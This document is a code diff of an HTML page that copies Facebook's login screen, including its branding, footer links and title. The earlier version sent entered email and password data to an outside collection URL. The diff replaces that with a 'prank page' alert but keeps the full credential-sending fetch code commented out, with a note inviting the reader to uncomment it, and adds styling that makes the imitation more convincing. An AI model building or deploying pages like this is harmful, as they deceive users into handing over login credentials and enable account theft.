@@ -2,50 +2,68 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Facebook – log in or sign up</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook – log in or sign up</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: Helvetica, Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
     }
     body {
       background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
     }
     .container {
       display: flex;
       justify-content: center;
       align-items: center;
       flex-direction: column;
-      height: 100vh;
+      flex-grow: 1;
+      padding: 20px;
+      animation: fadeIn 1s ease-in;
     }
     .logo {
-      font-size: 56px;
+      font-size: 60px;
       color: #1877f2;
       font-weight: bold;
       margin-bottom: 10px;
+      animation: slideIn 0.8s ease-out;
     }
     .subtitle {
-      font-size: 24px;
+      font-size: 28px;
       color: #1c1e21;
       margin-bottom: 40px;
+      text-align: center;
+      max-width: 500px;
     }
     .login-box {
       background: white;
-      width: 360px;
+      width: 400px;
+      max-width: 100%;
       padding: 20px;
       border-radius: 8px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      animation: popIn 0.5s ease-out;
     }
     .login-box input {
       width: 100%;
       padding: 14px;
       margin: 10px 0;
-      font-size: 17px;
+      font-size: 16px;
       border: 1px solid #dddfe2;
       border-radius: 6px;
+      transition: border-color 0.3s, box-shadow 0.3s;
+    }
+    .login-box input:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 5px rgba(24, 119, 242, 0.3);
     }
     .login-box button {
       width: 100%;
@@ -53,19 +71,33 @@
       margin-top: 10px;
       background-color: #1877f2;
       color: white;
-      font-size: 17px;
+      font-size: 18px;
+      font-weight: 600;
       border: none;
       border-radius: 6px;
-      font-weight: bold;
       cursor: pointer;
+      transition: background-color 0.3s;
+      position: relative;
     }
-    .login-box .forgot {
+    .login-box button:hover {
+      background-color: #165db7;
+    }
+    .login-box button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+    .forgot {
       text-align: center;
       margin: 12px 0;
       font-size: 14px;
       color: #1877f2;
       text-decoration: none;
       display: block;
+      transition: color 0.3s;
+    }
+    .forgot:hover {
+      color: #165db7;
+      text-decoration: underline;
     }
     .line {
       height: 1px;
@@ -75,6 +107,53 @@
     .create-btn {
       background: #42b72a;
     }
+    .create-btn:hover {
+      background: #36a420;
+    }
+    .footer {
+      background: #fff;
+      padding: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #737373;
+    }
+    .footer a {
+      color: #737373;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    .loader {
+      display: none;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #1877f2;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes slideIn {
+      from { transform: translateY(-20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes popIn {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
     @media screen and (max-width: 400px) {
       .login-box {
         width: 90%;
@@ -83,8 +162,7 @@
         font-size: 40px;
       }
       .subtitle {
-        font-size: 18px;
-        text-align: center;
+        font-size: 20px;
         padding: 0 10px;
       }
     }
@@ -93,31 +171,73 @@
 <body>
   <div class="container">
     <div class="logo">facebook</div>
-    <div class="subtitle">Facebook helps you connect and share with the people in your life.</div>
+    <div class="subtitle">Connect with friends and the world around you on Facebook.</div>
     <div class="login-box">
       <form id="loginForm">
-        <input type="text" name="email" placeholder="Email address or phone number" required>
+        <input type="text" name="email" placeholder="Email or phone number" required>
         <input type="password" name="password" placeholder="Password" required>
-        <button type="submit">Log In</button>
-        <a class="forgot" href="#">Forgotten password?</a>
+        <button type="submit" id="loginBtn">Log In <span class="loader" id="loader"></span></button>
+        <a class="forgot" href="forgot.html">Forgot password?</a>
         <div class="line"></div>
-        <button type="button" class="create-btn">Create new account</button>
+        <button type="button" class="create-btn" onclick="window.location.href='signup.html'">Create new account</button>
       </form>
     </div>
+  </div>
+  <div class="footer">
+    <a href="#">English (US)</a>
+    <a href="#">Español</a>
+    <a href="#">Português (Brasil)</a>
+    <a href="#">Français (France)</a>
+    <a href="#">More...</a>
+    <div style="margin-top: 10px;">
+      <a href="signup.html">Sign Up</a>
+      <a href="#">Log In</a>
+      <a href="#">Messenger</a>
+      <a href="#">Facebook Lite</a>
+      <a href="#">Watch</a>
+      <a href="#">Places</a>
+      <a href="#">Games</a>
+      <a href="#">Marketplace</a>
+      <a href="#">Meta Pay</a>
+      <a href="#">Meta Store</a>
+      <a href="#">Meta Quest</a>
+      <a href="#">Instagram</a>
+      <a href="#">Threads</a>
+    </div>
+    <div style="margin-top: 10px;">Meta © 2025</div>
   </div>
 
   <script>
     const form = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const loader = document.getElementById('loader');
+
     form.addEventListener('submit', function(e) {
       e.preventDefault();
+      loginBtn.disabled = true;
+      loader.style.display = 'block';
+      
+      // Simulate form submission
+      setTimeout(() => {
+        alert('Login attempt recorded! (This is a prank page, no real login occurred.)');
+        loader.style.display = 'none';
+        loginBtn.disabled = false;
+        form.reset();
+      }, 2000);
+
+      // Uncomment below if you want to keep the POST request (use with caution)
+      /*
       const formData = new FormData(form);
       fetch("https://8b40qq2.live.codepad.app/save.php", {
         method: "POST",
         body: formData
       }).then(res => res.text()).then(res => {
         alert("Logging in...");
+        loader.style.display = 'none';
+        loginBtn.disabled = false;
         form.reset();
       });
+      */
     });
   </script>
 </body>
